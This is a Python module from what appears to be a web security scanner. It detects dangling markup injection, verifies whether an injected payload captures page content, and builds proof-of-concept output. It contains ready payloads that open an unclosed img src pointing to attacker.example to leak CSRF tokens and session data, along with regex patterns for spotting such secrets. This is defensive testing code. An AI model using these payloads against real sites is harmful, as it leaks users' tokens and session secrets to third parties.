"""Dangling Markup Injection detection (Phase 30-2).

Dangling Markup Injection is a data-exfiltration technique that exploits
how browsers parse malformed HTML.  An attacker injects an unclosed
attribute value (e.g. ``<img src="https://attacker/?leak=``) into a
reflected parameter.  Because the quote is never closed, the browser
keeps consuming subsequent DOM content as part of the URL value until
it hits a quote character or the tag closes.  This leaks everything
between the injection point and the next quote to the attacker's server
-- including CSRF tokens, session IDs, and other secrets embedded in the
page.

Key characteristics:
  * **No JavaScript execution** -- the browser's HTML parser does the
    exfiltration via a resource load (img/src/etc.), so CSP
    ``script-src`` does not block it.
  * **Works on attribute contexts** -- requires the reflection point to
    be inside an HTML attribute value (``attr_dq``, ``attr_sq``,
    ``attr_noquote``) where the ``"`` or ``'`` character is not encoded.
  * **Dangling quote** -- the injected payload opens a new attribute
    with a URL but intentionally omits the closing quote, causing the
    parser to "swallow" subsequent content.

This module provides:

  1. **Static analysis** (:func:`analyze_page`) -- detects pages that
     have BOTH a reflection point in an attribute context AND sensitive
     data near the reflection point (CSRF tokens, hidden inputs, meta
     tags with session info).  This identifies pages *at risk* of
     dangling markup exfiltration.

  2. **Dynamic verification** (:func:`verify_dangling`) -- given the
     HTTP response after injecting a dangling payload, determines
     whether the payload successfully "captured" subsequent DOM content
     (i.e. no quote character closes the attribute before the next tag
     boundary, meaning the browser would send the captured content to
     the attacker's URL).

  3. **PoC builder** (:func:`build_poc_html`) -- generates a concrete
     dangling markup payload demonstrating the exfiltration.

The main scanner's ``_scan_param`` already sends ``dangling_markup``
payloads from the payload corpus; this layer complements it by
verifying that the dangling capture actually succeeds (not just that
the payload was reflected).
"""
from __future__ import annotations

import re
from typing import Any


# ---------------------------------------------------------------------------
# Patterns for static analysis
# ---------------------------------------------------------------------------

# Sensitive data patterns near reflection points -- these are the kinds
# of DOM content that an attacker wants to exfiltrate via dangling markup.
_CSRF_TOKEN_RE = re.compile(
    r'<input\b[^>]*\bname\s*=\s*["\']?(?:csrf|csrfmiddlewaretoken|_token|authenticity_token)["\']?'
    r'[^>]*\bvalue\s*=\s*["\']([^"\']+)["\']',
    re.IGNORECASE,
)
_HIDDEN_INPUT_VALUE_RE = re.compile(
    r'<input\b[^>]*\btype\s*=\s*["\']?hidden["\']?[^>]*\bvalue\s*=\s*["\']([^"\']+)["\']',
    re.IGNORECASE,
)
_SESSION_META_RE = re.compile(
    r'<meta\b[^>]*\b(?:name|content)\s*=\s*["\']?(?:session|csrf|token)["\']?[^>]*\bcontent\s*=\s*["\']([^"\']+)["\']',
    re.IGNORECASE,
)

# Reflection-in-attribute indicators: a marker token that appears inside
# an attribute value.  We look for the marker between quotes in an
# attribute context.
_ATTR_REFLECTION_RE = re.compile(
    r'\b(?:href|src|action|formaction|data|poster|background|cite|longdesc|usemap|profile|manifest|archive)\s*=\s*["\']([^"\']*MARKER[^"\']*)["\']',
    re.IGNORECASE,
)

# Dangling markup payload -- opens a URL attribute but does NOT close
# the quote, causing the parser to swallow subsequent content.
# We use a marker so we can find where the dangling capture ends.
DANGLING_PAYLOAD_TEMPLATE = 'https://attacker.example/?leak={marker}'

# Payloads for different attribute quote contexts.
DANGLING_PAYLOADS = {
    # For double-quote attribute context: close the current attribute,
    # start a new img tag with a dangling src.
    "attr_dq": '"><img src="https://attacker.example/?leak=',
    # For single-quote attribute context.
    "attr_sq": "'><img src='https://attacker.example/?leak=",
    # For unquoted attribute context: space + new tag.
    "attr_noquote": '><img src="https://attacker.example/?leak=',
    # For URL attribute context (href/src): inject a dangling URL
    # without closing the quote -- the browser treats subsequent content
    # as part of the URL.
    "url_dangling": "https://attacker.example/?leak=",
}


# ---------------------------------------------------------------------------
# Static analysis
# ---------------------------------------------------------------------------
def analyze_page(html: str, page_url: str | None = None,
                 extra_markers: list[str] | None = None) -> dict[str, Any]:
    """Analyze a page for dangling markup exfiltration risk.

    A page is "at risk" if it has BOTH:
      1. A reflection point in an attribute context (user input reaches
         an href/src/action/etc. attribute value).
      2. Sensitive data in the DOM near the reflection point (CSRF
         token, hidden input value, session meta tag).

    Returns a dict with a ``violations`` list.
    """
    violations: list[dict[str, Any]] = []
    if not html:
        return {"violations": violations, "page_url": page_url}

    # 1. Detect sensitive data in the DOM.
    sensitive_data: list[dict[str, str]] = []
    for m in _CSRF_TOKEN_RE.finditer(html):
        sensitive_data.append({
            "type": "csrf_token",
            "value": m.group(1)[:50],  # truncate for safety
            "position": m.start(),
        })
    for m in _HIDDEN_INPUT_VALUE_RE.finditer(html):
        val = m.group(1)
        if val and len(val) > 5:  # skip trivial values
            sensitive_data.append({
                "type": "hidden_input_value",
                "value": val[:50],
                "position": m.start(),
            })
    for m in _SESSION_META_RE.finditer(html):
        sensitive_data.append({
            "type": "session_meta",
            "value": m.group(1)[:50],
            "position": m.start(),
        })

    # 2. Detect reflection in attribute context (using extra_markers
    #    if provided by the scanner, otherwise look for common URL-like
    #    patterns in attributes).
    attr_reflections: list[dict[str, Any]] = []
    if extra_markers:
        for marker in extra_markers:
            pattern = _ATTR_REFLECTION_RE.pattern.replace("MARKER", re.escape(marker))
            for m in re.finditer(pattern, html, re.IGNORECASE):
                attr_reflections.append({
                    "marker": marker,
                    "context": "attribute_url",
                    "position": m.start(),
                    "matched": m.group(0)[:100],
                })

    # 3. If we have BOTH sensitive data AND an attribute reflection,
    #    report a dangling markup risk.
    if sensitive_data and attr_reflections:
        for ref in attr_reflections[:3]:
            # Find the nearest sensitive data to this reflection point.
            nearest = min(sensitive_data, key=lambda d: abs(d["position"] - ref["position"]))
            distance = abs(nearest["position"] - ref["position"])
            # Only report if the sensitive data is within 2000 chars
            # of the reflection point (dangling markup typically
            # captures content within the same tag or nearby tags).
            if distance < 2000:
                violations.append({
                    "type": "dangling_markup_risk",
                    "severity": "high",
                    "title": "Dangling markup exfiltration risk",
                    "evidence": (
                        f"Reflection in attribute context ({ref['context']}) "
                        f"with sensitive data ({nearest['type']}) {distance} chars "
                        f"downstream -- an attacker can inject a dangling "
                        f"URL attribute to capture the {nearest['type']} value"
                    ),
                    "marker": ref.get("marker", ""),
                    "sensitive_data_type": nearest["type"],
                    "distance": distance,
                })
    elif sensitive_data:
        # Page has sensitive data but no observed attribute reflection
        # -- still report as a lower-severity risk if the page has any
        # user-controllable URL attributes (href/src/action).
        url_attr_re = re.compile(
            r'\b(?:href|src|action)\s*=\s*["\']?(?:https?:|//|/)',
            re.IGNORECASE,
        )
        if url_attr_re.search(html):
            violations.append({
                "type": "dangling_markup_potential",
                "severity": "medium",
                "title": "Potential dangling markup target (sensitive data + URL attributes)",
                "evidence": (
                    f"Page contains sensitive data ({sensitive_data[0]['type']}) "
                    f"and URL-bearing attributes (href/src/action).  If any of "
                    f"these attributes reflect user input, a dangling markup "
                    f"attack could exfiltrate the {sensitive_data[0]['type']}."
                ),
            })

    return {"violations": violations, "page_url": page_url}


# ---------------------------------------------------------------------------
# Dynamic verification
# ---------------------------------------------------------------------------
def verify_dangling(response_html: str, payload: str,
                    marker: str | None = None) -> dict[str, Any]:
    """Verify whether a dangling markup payload successfully captured DOM content.

    After injecting a dangling payload (e.g. ``"><img src="https://attacker/?leak=``)
    into a reflected parameter, examine the HTTP response to determine:

      1. Was the payload reflected? (``reflected: True/False``)
      2. Did the payload's opening quote get reflected unencoded?
         (``quote_unencoded: True/False``)
      3. How much DOM content was "captured" between the payload and
         the next quote character? (``captured_length``, ``captured_preview``)
      4. Does the captured content contain sensitive data?
         (``contains_sensitive_data: True/False``, ``sensitive_data_type``)

    Returns a dict with these keys.  When ``captured_length > 0`` and
    ``quote_unencoded`` is True, the dangling markup attack succeeds.
    """
    result = {
        "reflected": False,
        "quote_unencoded": False,
        "captured_length": 0,
        "captured_preview": "",
        "contains_sensitive_data": False,
        "sensitive_data_type": None,
        "success": False,
    }
    if not response_html or not payload:
        return result

    # Find the payload in the response.
    idx = response_html.find(payload)
    if idx < 0:
        return result
    result["reflected"] = True

    # Check if the quote character in the payload was reflected unencoded.
    # The dangling payloads end with `=` and an unclosed quote.  If the
    # server encoded the quote (e.g. `&quot;`), the dangling attack fails
    # because the browser sees the encoded quote as literal text.
    payload_end = idx + len(payload)
    # The quote type that the dangling attribute is opened with -- the
    # browser will only stop capturing at THIS quote type, not the other.
    # E.g. if the payload opens src="... (double-quote), single-quotes in
    # downstream attributes (type='hidden') do NOT end the capture.
    dangling_quote: str | None = None
    if payload.startswith('"') or payload.startswith("'"):
        result["quote_unencoded"] = True
        # The payload's leading quote closes the current attribute; the
        # dangling attribute is opened later in the payload.  Count quotes
        # to determine which type is left unclosed.
        dq = payload.count('"')
        sq = payload.count("'")
        if dq % 2 == 1:
            dangling_quote = '"'
        elif sq % 2 == 1:
            dangling_quote = "'"
        else:
            dangling_quote = '"'  # default to double-quote
    elif payload.startswith("https://attacker"):
        # URL-context dangling: no leading quote in payload, but we need
        # to check if the attribute's opening quote is unencoded.
        before = response_html[max(0, idx - 1):idx]
        if before in ('"', "'"):
            result["quote_unencoded"] = True
            dangling_quote = before

    if not result["quote_unencoded"]:
        return result

    # Find the next matching quote character after the payload -- this is
    # where the browser would stop capturing content.
    #
    # When the payload opens a *dangling* attribute (the quote is reflected
    # unencoded and the attribute value is never closed), the browser's HTML
    # parser treats EVERYTHING -- including '>', '<', and the *other* quote
    # type -- as part of the attribute value until it hits the next matching
    # quote.  So we must NOT break on '>' or on the non-matching quote type.
    # Breaking on '>' here would miss real exfiltration of downstream tags
    # like <input type="hidden" name="csrf" value="...">.
    remaining = response_html[payload_end:]
    next_quote = -1
    if dangling_quote:
        next_quote = remaining.find(dangling_quote)
    else:
        # Fallback: break on either quote type.
        for i, ch in enumerate(remaining):
            if ch in ('"', "'"):
                next_quote = i
                break

    if next_quote < 0:
        # No closing quote found -- the capture extends to end of response.
        captured = remaining
    else:
        captured = remaining[:next_quote]

    result["captured_length"] = len(captured)
    result["captured_preview"] = captured[:200]

    # Check if captured content contains sensitive data.
    if captured:
        if _CSRF_TOKEN_RE.search(captured):
            result["contains_sensitive_data"] = True
            result["sensitive_data_type"] = "csrf_token"
        elif _HIDDEN_INPUT_VALUE_RE.search(captured):
            result["contains_sensitive_data"] = True
            result["sensitive_data_type"] = "hidden_input_value"
        elif _SESSION_META_RE.search(captured):
            result["contains_sensitive_data"] = True
            result["sensitive_data_type"] = "session_meta"
        elif re.search(r'(?:token|session|csrf|secret|password|key)\s*=\s*["\']?[^\s"\'>]{5,}',
                       captured, re.IGNORECASE):
            result["contains_sensitive_data"] = True
            result["sensitive_data_type"] = "generic_secret"

    # Dangling markup attack succeeds if content was captured.
    result["success"] = result["captured_length"] > 0

    return result


# ---------------------------------------------------------------------------
# PoC builder
# ---------------------------------------------------------------------------
def build_poc_html(url: str, violation_type: str = "dangling_markup",
                   context: str = "attr_dq",
                   captured_content: str = "") -> str:
    """Build a PoC demonstrating the dangling markup attack.

    The PoC shows the exact payload to inject and explains what content
    would be captured.
    """
    payload = DANGLING_PAYLOADS.get(context, DANGLING_PAYLOADS["attr_dq"])
    captured_desc = ""
    if captured_content:
        captured_desc = (
            f"\n<!-- Captured DOM content (sent to attacker URL):\n"
            f"     {captured_content[:150]}...\n"
            f"  -->"
        )
    return (
        f"<!-- Dangling Markup Injection PoC against {url} -->\n"
        f"<!-- Inject this payload into the reflected parameter ({context}): -->\n"
        f"{payload}\n"
        f"<!-- The browser parses the unclosed src attribute and sends all\n"
        f"     subsequent DOM content (up to the next quote char) to the\n"
        f"     attacker's server as part of the URL. -->{captured_desc}"
    )
